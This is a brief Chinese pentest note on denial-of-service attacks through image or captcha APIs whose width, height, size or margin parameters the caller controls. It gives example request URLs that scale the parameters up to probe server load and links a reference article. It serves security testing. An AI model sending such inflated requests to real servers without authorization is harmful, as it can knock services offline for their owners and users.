## 图片 DoS

图片 API 参数大小可控, 导致 DoS 攻击

```
图片 API 为类似的 URL 时
http://debian/api.php?op=checkcode&width=12&height=26
可修改参数值 (建议先使用一个较小的参数测试，避免服务器崩溃) 查看响应时间是否变化
http://debian/api.php?op=checkcode&width=1200&height=26
有时需要自己构造参数
?w=100&h=100
?width=100&height=100
?size=1000
?margin=1000
```

---

参考链接

- [新类型【漏洞】验证码大小可控导致的拒绝服务攻击漏洞](https://zhuanlan.zhihu.com/p/41800341)
